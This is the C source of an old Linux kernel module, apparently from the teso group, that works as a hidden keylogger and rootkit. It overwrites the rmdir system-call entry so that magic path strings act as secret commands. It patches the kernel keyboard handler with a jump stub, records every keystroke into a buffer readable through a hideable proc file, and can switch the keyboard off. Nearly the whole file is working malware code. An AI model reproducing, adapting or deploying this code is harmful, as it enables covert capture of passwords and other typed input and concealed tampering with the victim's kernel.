/*
 * linux keyboard fun
 * by  Palmers / teso
 *  (pa1mers@gmx.de)
 *
 * heavily based on silvio cesare's kernel-hijack.txt (based? ha! it just EXTENDS the sample module!)
 */
#include "kkfun.h"


extern void *sys_call_table[];
int ProcFileVisible;			/* is the procfile registered? */
int ThouShaltNotTypewrite;		/* if !0 keybord disabled */
int eofSwitch;				/* eo proc file */
unsigned int ReadCount;			/* position in buffer */
unsigned int WriteCount;		/* bytes in buffer */
unsigned char LogBuffer[LOG_LENGTH + 1];	/* log buffer */

unsigned char (*handle_kbd_event)(void) = (unsigned char (*)(void))HANDLE_KBD_EVENT_ADD;
void (*handle_mouse_event)(unsigned char) = (void (*)(unsigned char))HANDLE_MOUSE_EVENT_ADD;
void (*handle_scancode)(unsigned char, int) = (void (*)(unsigned char, int))HANDLE_SCANCODE_ADD;
int (*do_acknowledge)(unsigned char) = (int (*)(unsigned char))DO_ACKNOWLEDGE_ADD;


int (*k_rmdir) (const char *);


#define CODESIZE        7
static char orig_handler_code[7];
static char my_handler_code[7] =
        "\xb8\x00\x00\x00\x00"	/*      movl   $0,%eax  */
        "\xff\xe0";		/*      jmp    *%eax    */


/*
 * copy a buffer
 */
void *_memcpy(void *dest, const void *src, int size)
{
        const char *p = src;
        char *q = dest;
        int i;

        for (i = 0; i < size; i++) *q++ = *p++;

        return dest;
}


/*
 * clear a buffer
 */
void _bzero (void *buf, int size)
{
	char *dest = buf;
	int x = 0;
	for (; x < size; x++)
		*dest++ = 0;
} 


/*
 * read from proc file
 */
int readLog (struct file *file, char *buf, int len, loff_t *dunno)
{
  if (eofSwitch)
    {
      eofSwitch ^= 1;
      _bzero (LogBuffer, LOG_LENGTH);
      WriteCount = 0;
      ReadCount = 0;
      return 0;
    }

  if (WriteCount)
    len = (len + ReadCount) % WriteCount;		/* dont do read shit */
  copy_to_user (buf, LogBuffer + ReadCount, len);
  ReadCount += len;
  if (ReadCount > WriteCount)
    eofSwitch ^= 1;

  return len;
}


/*
 * open proc file (dummy)
 */
int openLog (struct inode *inode, struct file *file)
{
  MOD_INC_USE_COUNT;
  return 0;
}


/*
 * close proc file (dummy)
 */
int closeLog (struct inode *inode, struct file *file)
{
  MOD_DEC_USE_COUNT;
  return 0;
}


static int accLogAllowd (struct inode *inode, int op)
{
  if (op == 4 || (op == 2 && current->euid == 0))
    return 0;

  return -EACCES;
}


static struct file_operations FileOpsProc =
  {
    NULL,                       /* lseek */
    readLog,                    /* read */
    NULL,                       /* write */
    NULL,                       /* readdir */
    NULL,                       /* poll */
    NULL,                       /* ioctl */
    NULL,                       /* mmap */
    openLog,                    /* open */
    NULL,                       /* flush */
    closeLog,                   /* release */
    NULL,                       /* fsync */
    NULL,                       /* fasync */
    NULL,                       /* check_media_change */
    NULL,                       /* revalidate */
    NULL                        /* lock */
  };


static struct inode_operations InodeOpsProc =
  {
    &FileOpsProc,
    NULL,               /* create */
    NULL,               /* lookup */
    NULL,               /* link */
    NULL,               /* unlink */
    NULL,               /* symlink */
    NULL,               /* mkdir */
    NULL,               /* rmdir */
    NULL,               /* mknod */
    NULL,               /* rename */
    NULL,               /* readlink */
    NULL,               /* follow_link */
    NULL,               /* readpage */
    NULL,               /* writepage */
    NULL,               /* bmap */
    NULL,               /* truncate */
    accLogAllowd,       /* permissions */
    NULL,               /* smap */
    NULL,               /* updatepage */
    NULL                /* revalidate */
  };


/*
 * proc dir entry
 */
static struct proc_dir_entry LogFile =
  {
    0,                                  /* inode - 0 = go get your self */
    NAME_LENGTH,                        /* name length */
    NAME,                               /* name */
    S_IFREG | S_IRUGO | S_IWUSR,        /* permission */
    1,                                  /* links */
    0,                                  /* uid */
    0,                                  /* gid */
    LOG_LENGTH,  /* be honest :) */     /* size */
    &InodeOpsProc,                      /* inode_operations */
    NULL,                               /* get_info */
    NULL,                               /* fill_inode */
    NULL, NULL, NULL,                   /* proc_dir_entry: *next, *parent, *subdir */
    NULL,                               /* void *data */
    NULL,                               /* read_proc */
    NULL,                               /* write_proc */
    NULL,                               /* readlink_proc */
    0,                                  /* use count */
    0                                   /* delete flag */
  };



/*
 * turn on/off keyboard
 */
void switchThouShaltNot ()
{
  ThouShaltNotTypewrite ^= 1;
}


/*
 * hide/unhide procfile
 */
void switchVisibilityOfProcFile ()
{
  ProcFileVisible ^= 1;

  if (ProcFileVisible == 0)
    {
      proc_unregister(&proc_root, LogFile.low_ino);
    }
  else
    {
      proc_register(&proc_root, &LogFile);
    }
}


/*
 * use magic strings and "rmdir" for dealing with stuff
 */
int
my_rmdir (const char *path)
{
  if (strstr (path, MAGIC) != NULL)
    {
      if (strstr (path, OF_KB) != NULL)
        {
	  switchThouShaltNot ();
          return 0;
	}
      else if (strstr (path, OF_PR) != NULL)
	{
	  switchVisibilityOfProcFile ();
	  return 0;
	}
    } 
  return k_rmdir (path);
}


/*
 * convert a read byte to a character
 */
__inline__ unsigned char convertCode (unsigned char x)
{
  if (!(x & 0x80)) /* is key pressed or released? */
    {
      x &= 0x7f;
      if ((x == 42) && !(Mode & L_SHIFT))
        Mode ^= L_SHIFT;
      else if ((x == 54) && !(Mode & R_SHIFT))
        Mode ^= R_SHIFT;
      else if ((x == 56) && !(Mode & R_ALT))
        Mode ^= R_ALT;
    }
  else
    {
      x &= 0x7f;
      if ((x == 42) && (Mode & L_SHIFT))
        Mode ^= L_SHIFT;
      else if ((x == 54) && (Mode & R_SHIFT))
        Mode ^= R_SHIFT;
      else if ((x == 56) && (Mode & R_ALT))
        Mode ^= R_ALT;
      else
        {
          if (Mode & R_ALT)
            x = code2key2[x];
          else if ((Mode & L_SHIFT) || (Mode & R_SHIFT))
            x = code2key1[x];
          else
            x = code2key0[x];
          return x;
        }
      return 0;
    }
/* not reached */
  return 0;
}


/*
 * handle_kbd_event (void):
 * This reads the keyboard status port, and does the
 * appropriate action.
 * ^^^^^^^^^^^<-- depends, right? ;)
 *
 * my_handle_kbd_event(void):
 * features:
 *  +turn off keyboard
 *  +log key strokes
 */
static unsigned char my_handle_kbd_event(void)
{
        unsigned char status = kbd_read_status();
        unsigned int work = 10000;

        while (status & KBD_STAT_OBF) {
                unsigned char scancode;
                scancode = kbd_read_input();

		if (!ThouShaltNotTypewrite) {
                	if (status & KBD_STAT_MOUSE_OBF) {
                	        handle_mouse_event(scancode);
                	} else {
                	        if (do_acknowledge(scancode)) {
					if (WriteCount < LOG_LENGTH)
						LogBuffer[WriteCount++] = convertCode (scancode);
                	                handle_scancode(scancode, !(scancode & 0x80));
					}
                	        mark_bh(KEYBOARD_BH);
                	}
		}

		status = kbd_read_status();

                if(!work--)
                {
                        printk(KERN_ERR "pc_keyb: controller jammed (0x%02X).\n",
                                status);
                        break;
                }
        }
        return status;
}


int init_module ()
{
/* better initialize ... */
  ProcFileVisible = 0;
  ThouShaltNotTypewrite = 0;
  eofSwitch = 0;
  ReadCount = 0;
  WriteCount = 0;
  _bzero (LogBuffer, LOG_LENGTH + 1);

/* sys calls we need */
  k_rmdir = sys_call_table[__NR_rmdir];
  sys_call_table[__NR_rmdir] = my_rmdir;


/* setup functions */
  *(long *)&my_handler_code[1] = (long)my_handle_kbd_event;	/* write the address of our function */
  _memcpy (orig_handler_code, handle_kbd_event, CODESIZE);	/* save the original function code */
  _memcpy (handle_kbd_event, my_handler_code, CODESIZE);	/* and replace it */

/* register the log - proc file */
  return 0;
}


void cleanup_module ()
{
/* clean exit */
  sys_call_table[__NR_rmdir] = k_rmdir;
  _memcpy(handle_kbd_event, orig_handler_code, CODESIZE);
}

EXPORT_NO_SYMBOLS;
